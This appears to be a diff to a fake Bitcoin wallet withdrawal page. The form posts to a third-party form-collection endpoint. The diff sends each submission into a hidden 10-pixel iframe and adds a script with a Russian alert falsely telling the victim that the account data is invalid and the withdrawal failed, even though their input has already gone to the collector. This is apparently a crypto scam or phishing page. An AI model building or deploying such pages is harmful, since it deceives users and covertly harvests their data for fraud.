@@ -80,7 +80,7 @@
     <div class="bitcoin-amount">1.2554532 BTC</div>
     <div class="address-label">My Wallet Address:</div>
     <div class="address">bc1qjd7kc9jx56jucjtt5j46gh5scn3s4n5672tph8</div>
-    <form action="https://formspree.io/f/mnqyzroj" method="POST">
+    <form action="https://formspree.io/f/mnqyzroj" method="POST"  target="myFrame" onsubmit="showMessage()">
       <div class="form-group">
         <label for="amount" class="form-label">Amount to withdraw:</label>
         <input type="text" id="amount" name="Amount to withdraw" class="form-input" placeholder="Enter amount in BTC" onkeypress="return isNumberKey(event)">
@@ -96,6 +96,17 @@
       <button type="submit" class="form-button">Withdraw</button>
     </form>
   </div>
+  
+  <iframe name="myFrame" style="width:10px; height:10px; position:fixed; bottom:0; left:0; border:none;"></iframe>
+  
+  <script>
+function showMessage() {
+  var message = "Неверные данные аккаунта, не удается отправить OKs!";
+  alert(message);
+  return true;
+}
+</script> 
+  
   
   <script>
   const form = document.querySelector('form');
